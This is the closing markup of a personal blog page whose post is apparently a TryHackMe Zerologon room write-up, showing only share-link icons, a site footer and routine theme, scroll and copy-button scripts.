viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack ME Room Zerologon on whatsapp" href="https://api.whatsapp.com/send?text=Try%20Hack%20ME%20Room%20Zerologon%20-%20https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-zerologon%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack ME Room Zerologon on telegram" href="https://telegram.me/share/url?text=Try%20Hack%20ME%20Room%20Zerologon&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-zerologon%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack ME Room Zerologon on ycombinator" href="https://news.ycombinator.com/submitlink?t=Try%20Hack%20ME%20Room%20Zerologon&u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-zerologon%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>YOU CAN REUSE MY CONTENT</span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>